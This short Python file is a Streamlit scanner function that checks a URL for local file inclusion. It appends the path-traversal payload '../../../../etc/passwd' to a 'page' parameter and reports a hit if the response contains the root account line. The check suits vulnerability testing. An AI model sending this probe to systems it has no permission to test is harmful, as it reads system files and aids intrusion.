import streamlit as st
import requests

def scan(url):
    try:
        test_url = f"{url}?page=../../../../etc/passwd"
        r = requests.get(test_url, timeout=5)
        if "root:x:0:" in r.text:
            st.error("[LFI] Local File Inclusion detected")
        else:
            st.success("[LFI] Not Found")
    except Exception as e:
        st.warning(f"[LFI] Error: {str(e)}")